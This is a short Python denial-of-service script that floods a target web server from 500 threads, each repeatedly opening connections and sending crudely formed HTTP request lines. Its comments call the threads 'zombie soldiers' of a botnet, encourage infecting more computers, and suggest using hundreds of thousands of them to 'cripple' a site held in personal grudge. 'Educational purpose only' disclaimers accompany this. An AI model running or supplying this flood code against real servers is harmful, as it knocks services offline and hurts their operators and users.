import threading
import socket

target = '' #target IP 
# IP OR DOMAIN NAME OF YOUR TARGET - 'PLEASE MAKE SURE YOU HAVE PERMISSION FOR ATTACK(TESTING)
# OR MAKE SURE YOU ARE HITTING YOUR OWN SERVER OR TEST MACHINE
# HIGHLY ILLEGAL!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

port = 80
# PORT 22 - FOR SSH
# PORT 80 - FOR HTTP
# USE PORT 80 FOR 'HTTP' IF YOU WISH TO TAKE THE SITE DOWN AND MAKE IT NOT RESPONSIVE
# YOU CAN AS WELL USE OTHER PORTS BASED ON TYPE OF ATTACK

ip = '' # IP to connect


connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        # DEPENDING ON THE TYPE OF ATTACK AND PORT, THE 'SEND TO' METHOD WILL TAKE IN DIFFERENT ARGS
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host /" + ip + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.close()

        # global connected
        # connected += 1

botnet = 500
# REMEMBER, BOTNET IS THE NUMBER OF YOUR ZOMBIE SOLDIERS TO USE AND HIT THE SITE BEHIND THE SCENE
# THE BIGGER THE SITE, THE HIGHER THE NUMBER OF COMPUTERS YOU NEED TO INFECT AND RECRUIT, MAKE THEM ZOMBIES
# IF YOU HAVE VERY PERSONAL ISSUES WITH THE TARGET, USE HUNDRED OF THOUSANDS AND CRIPPLE THEIR ENTIRE SITE
# MIND YOU, EDUCATIONAL PURPOSE ONLY, ANY DARK INTENT WILL LAND YOU IN JAIL!!!!
# YOU CAN TEST WITH 'YOUR OWN SERVER OR TEST ENVIRONMENT'
for i in range(botnet):
    thread = threading.Thread(target=attack)
    thread.start()
